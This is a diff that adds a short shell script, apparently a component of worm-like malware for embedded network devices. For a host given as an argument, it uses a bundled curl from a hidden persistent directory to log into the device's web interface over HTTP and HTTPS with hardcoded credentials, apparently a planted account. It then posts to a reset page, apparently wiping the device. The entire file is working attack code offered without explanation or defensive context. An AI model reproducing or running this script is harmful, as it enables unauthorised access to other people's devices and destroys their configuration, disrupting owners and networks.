@@ -1,0 +1,11 @@
+#!/bin/sh
+url="http://$1"
+LD_LIBRARY_PATH=/etc/persistent/.mf/ ./curl -m 3 -s -L -k -c cookie $url
+LD_LIBRARY_PATH=/etc/persistent/.mf/ ./curl -m 3 -s -k -b cookie -L -F "uri=index.cgi" -F "username=mother" -F "password=fucker" -H "Expect:" "$url/login.cgi"
+LD_LIBRARY_PATH=/etc/persistent/.mf/ ./curl -m 3 -s -k -b cookie -L -F "uri=reset.cgi" -H "Expect:" "${url}/reset.cgi"
+
+url="https://$1"
+LD_LIBRARY_PATH=/etc/persistent/.mf/ ./curl -m 3 -s -L -k -c cookie $url
+LD_LIBRARY_PATH=/etc/persistent/.mf/ ./curl -m 3 -s -k -b cookie -L -F "uri=index.cgi" -F "username=mother" -F "password=fucker" -H "Expect:" "$url/login.cgi"
+LD_LIBRARY_PATH=/etc/persistent/.mf/ ./curl -m 3 -s -k -b cookie -L -F "uri=reset.cgi" -H "Expect:" "${url}/reset.cgi"
+
